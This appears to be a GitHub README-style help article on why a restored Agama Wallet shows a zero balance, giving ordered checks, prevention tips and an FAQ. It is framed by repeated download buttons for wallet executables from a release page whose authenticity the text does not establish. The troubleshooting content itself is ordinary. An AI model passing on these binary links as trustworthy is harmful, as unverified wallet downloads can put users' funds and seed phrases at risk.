[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Agama Wallet Shows Zero Balance: Causes and Checks

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

A restored Agama wallet showing zero usually has one of four causes: the address range scanned is too narrow, the derivation differs from the wallet that created it, the sync has not finished, or the phrase is not the one that funded the wallet. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, and the order of these checks matters because the cheapest ones come first.

## You'll see this if

The restore completed without an error, the interface accepted the phrase, and the balance is empty while you are sure the wallet held funds.

| What you see | Likely cause | Check |
|---|---|---|
| Empty balance, sync at 100% | Address range too narrow | Look for a known address in the wallet |
| Empty balance, sync still rising | Incomplete scan | Wait; compare block height |
| Balance appears then vanishes | Rescan in progress | Let it finish |
| Some assets present, one missing | Mode or per-asset support | Switch mode; check the asset list |
| Phrase rejected outright | Words, order or spelling | Compare with your written record |

## Why it happens

A wallet does not "contain" a balance. It derives addresses from the phrase, asks the chain about each, and adds up what it finds. Every step can fail without producing an error message.

The address range is the most common culprit. Wallets derive addresses in sequence and stop after a run of unused ones. If you used addresses beyond that point, a restored wallet with a narrower scan will not see them, and the total will look wrong rather than broken.

Derivation is the second. Different software can derive different addresses from the same phrase, especially across wallet generations, so a restore into a different wallet can be correct and still empty.

Sync is the third. A wallet that has not caught up cannot report what it has not seen, and a rescan shows partial totals while it works.

## Fix

Work in this order, and stop when the balance matches.

1. **Confirm the phrase.** Word count, order and spelling, compared against your written record rather than memory.
2. **Let the scan finish.** Watch the block height reach the chain tip before judging the result.
3. **Look for a known address.** If you recorded one receiving address, check whether it appears; if it does not, the derivation is the problem.
4. **Widen the scan if the wallet allows it.** A gap-limit or address-range setting exists for exactly this case, and it is the setting most often missing from simple wallets.
5. **Try the other mode.** SPV and Native read the chain differently, and one may see what the other does not.
6. **Check the asset list.** A zero balance for one asset can be a support question rather than a recovery one.

[Restoring an Agama wallet](https://github.com/agama-wallet/agama-wallet/blob/main/restore-from-seed-phrase.md) covers the procedure, and [why a balance is not one number](https://github.com/agama-wallet/utxo/blob/main/why-balance-is-not-one-number.md) explains what each figure means.

## If that did not work

If the phrase is accepted but no known address appears, restore into software that lets you set the derivation or scan a wider range. This is a compatibility problem, not a loss.

If the wallet shows a pending transaction that never confirms, the balance may be reserved rather than spent; check the transaction on an explorer before concluding anything.

If the funds moved while the wallet was offline, the phrase may have been exposed elsewhere. That is a compromise scenario, and the response is a new wallet rather than more restoring.

If nothing works and the addresses are funded on-chain, do not send anything to a "recovery service". The phrase is the only route, and anyone asking for it is taking the wallet. Never share or type that phrase outside wallet software, whatever the offer promises.

## Prevention

- **Record one address per asset when you create a wallet.** It turns a guess into a check.
- **Note the software and version you used.** Derivation differences are version-specific.
- **Test a restore before you need it.** A restore you have never rehearsed is a hope.
- **Keep the phrase offline.** [Backing up an Agama wallet](https://github.com/agama-wallet/agama-wallet/blob/main/backup-what-dat-covers.md) covers storage.
- **Do not assume a zero balance means lost funds.** It usually means unscanned addresses.

## FAQ

### Does a zero balance mean the funds are gone?

Almost never. The usual cause is addresses the restored wallet has not derived or scanned, which is a settings problem rather than a loss.

### Why did the wallet accept my phrase and still show nothing?

Because acceptance only means the phrase is well-formed. Whether it derives the addresses that hold your funds depends on the wallet's derivation rules and scan range.

### Can I recover funds from an address the wallet does not show?

If you can derive that address from the phrase in software that supports the same derivation, yes. The address exists on-chain; the wallet's view is what is missing.

### How long should a scan take?

On SPV, minutes for a typical wallet; on Native, as long as the local chain needs to catch up, which can be hours after a long gap. If the block height is still climbing, the scan is working rather than failing, and closing the application resets that progress.

### Could a wrong address format explain it?

Yes, in one specific way: if the wallet is reading a different chain than the one that holds the funds, every address looks valid and every balance looks empty. Check the chain before the phrase.

### Should I keep restoring until it works?

Restore into different software, not repeatedly into the same one. Repeating an identical restore produces an identical result, and each attempt is another place the phrase is typed.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [Restoring an Agama Wallet: Seed, Passphrase and Wallet File](https://github.com/agama-wallet/agama-wallet/blob/main/restore-from-seed-phrase.md)
- [Why a Seed Phrase Fails to Restore a Wallet](https://github.com/agama-wallet/agama-wallet/blob/main/why-a-seed-phrase-fails.md)
- [Why a UTXO Wallet Balance Is Not One Number](https://github.com/agama-wallet/utxo/blob/main/why-balance-is-not-one-number.md)
- [Native Mode vs SPV Mode in Agama Wallet](https://github.com/agama-wallet/agama-wallet/blob/main/native-versus-spv-mode.md)
